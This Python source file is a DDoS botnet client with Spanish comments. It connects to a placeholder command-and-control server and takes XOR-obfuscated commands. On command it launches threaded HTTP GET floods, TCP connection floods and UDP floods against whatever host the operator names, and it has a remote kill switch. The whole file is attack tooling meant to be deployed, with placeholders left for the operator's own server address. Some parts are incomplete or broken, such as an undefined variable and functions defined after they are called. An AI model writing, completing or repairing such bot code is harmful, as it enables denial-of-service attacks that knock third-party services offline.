import socket
import sys
import os
import time
import random
import threading
import base64 as b64

cnc   = str("your_cnc_ip")  # Reemplaza con la IP de tu servidor C&C
cport = int(8443)  # Reemplaza con el puerto que has abierto
key   = "asdfghjkloiuytresxcvbnmliuytf"

useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1", ...]  # Asegúrate de tener todos los user-agents aquí
acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", ...]  # Asegúrate de tener todos los acceptall aquí

stop = False

def HTTP(ip, port, path):
    global stop
    while True:
        if stop:
            break
        get_host = "GET " + path + "?" + str(random.randint(0, 50000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
        connection = "Connection: Keep-Alive\r\n"
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept = random.choice(acceptall)
        http = get_host + useragent + accept + connection + "\r\n"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((str(ip), int(port)))
            for y in range(100):
                s.send(str.encode(http))
        except:
            s.close()

def CC(ip, port):
    global stop
    while True:
        if stop:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip), int(port)))
            s.send("\000".encode())
            s.close()
        except:
            s.close()

def UDP(ip, port, size):
    global stop
    while True:
        if stop:
            break
        udpbytes = random._urandom(int(size))
        sendip = (str(ip), int(port))
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            for y in range(thread):
                s.sendto(udpbytes, sendip)
            s.close()
        except:
            s.close()

def cmdHandle(sock):
    global stop
    attack = 0
    sock.send(xor_enc("1337", key).encode())  # login code
    while True:
        tmp = sock.recv(1024).decode()
        if len(tmp) == 0:
            main()
        data = xor_dec(tmp, key)
        if data[0] == '!':
            try:
                command = data.split()
                print(command)
                if command[0] == xor_dec('QBAH', key):  # encoded keywords: !cc
                    if attack != 0:
                        stop = True
                        attack = 0
                    stop = False
                    for x in range(int(command[3])):
                        p = threading.Thread(target=CC, args=(command[1], command[2]))
                        p.start()
                    attack += 1
                elif command[0] == xor_dec('QBsQEhc=', key):  # encoded keywords: !http
                    if attack != 0:
                        stop = True
                        attack = 0
                    stop = False
                    for x in range(int(command[3])):
                        p = threading.Thread(target=HTTP, args=(command[1], command[2], command[4]))
                        p.start()
                    attack += 1
                elif command[0] == xor_dec('QAYAFg==', key):  # encoded keywords: !udp
                    if attack != 0:
                        stop = True
                        attack = 0
                    stop = False
                    for x in range(int(command[3])):
                        p = threading.Thread(target=UDP, args=(command[1], command[2], command[4]))
                        p.start()
                    attack += 1
                elif command[0] == xor_dec('QAAQCRc=', key):
                    stop = True
                    attack = 0  # clear attack list
                elif command[0] == xor_dec('QBgNCgs=', key):  # !kill : kill bot
                    sys.exit(1)
            except:
                pass
        if data == xor_dec("ERoKAQ==", key):  # ping
            sock.send(xor_enc("pong", key).encode())  # keepalive and check connection alive

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.connect((cnc, cport))
            cmdHandle(s)
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(5)  # Esperar 5 segundos antes de intentar reconectarse

if __name__ == '__main__':
    main()

# xor enc part#
def xor_enc(string, key):
    lkey = len(key)
    secret = []
    num = 0
    for each in string:
        if num >= lkey:
            num = num % lkey
        secret.append(chr(ord(each) ^ ord(key[num])))
        num += 1
    return b64.b64encode("".join(secret).encode()).decode()

def xor_dec(string, key):
    leter = b64.b64decode(string.encode()).decode()
    lkey = len(key)
    string = []
    num = 0
    for each in leter:
        if num >= lkey:
            num = num % lkey
        string.append(chr(ord(each) ^ ord(key[num])))
        num += 1
    return "".join(string)
